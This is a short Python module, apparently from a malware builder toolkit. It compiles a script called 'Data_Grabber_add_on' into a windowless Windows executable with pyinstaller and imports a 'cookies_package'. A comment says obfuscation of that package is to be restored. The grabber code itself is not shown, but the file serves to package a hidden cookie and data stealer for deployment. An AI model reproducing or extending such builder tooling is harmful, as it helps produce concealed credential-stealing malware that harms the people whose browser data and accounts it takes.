import os
import shutil
from cookies_package import *
from util.common import clear, cleanup
from colorama import Fore



fileName = "Data_Grabber_add_on"


def Create_Data():
    clear()
    try:
        # Add back cookies_packge obfusacation after update

        os.system(f"pyinstaller --onefile --noconsole --clean --log-level=INFO -n {fileName} {fileName}.py")

        shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")
        
        cleanup(fileName)

    except Exception as e:
        print(f'{Fore.LIGHTRED_EX}Error while making exe{Fore.RESET}: {e}')
        cleanup(fileName)
    else:
        print(f"\n{Fore.GREEN}Finshed creating data grabber add on{Fore.RESET}\n")
    input(f'{Fore.RESET}[{Fore.YELLOW}>>>{Fore.RESET}] {Fore.CYAN}Enter anything to continue {Fore.RESET}. . .')